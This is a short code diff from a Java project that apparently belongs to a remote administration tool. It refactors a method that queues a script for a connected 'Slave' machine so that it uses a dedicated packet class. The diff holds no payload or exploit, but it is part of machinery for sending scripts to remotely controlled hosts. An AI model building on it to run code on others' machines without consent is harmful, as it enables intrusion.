@@ -4,6 +4,7 @@ import javax.swing.ImageIcon;
 
 import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet35Script;
 import com.redpois0n.ui.panels.PanelControlScript;
 import com.redpois0n.utils.IconUtils;
 
@@ -61,12 +62,7 @@ public class Script {
 	}
 
 	public static void sendScript(Slave sl, int type, String content) {
-		PacketBuilder packet = new PacketBuilder(OutgoingHeader.SCRIPT);
-
-		packet.add(getSendString(type));
-		packet.add(content);
-		
-		sl.addToSendQueue(packet);
+		sl.addToSendQueue(new Packet35Script(getSendString(type), content));
 	}
 
 }
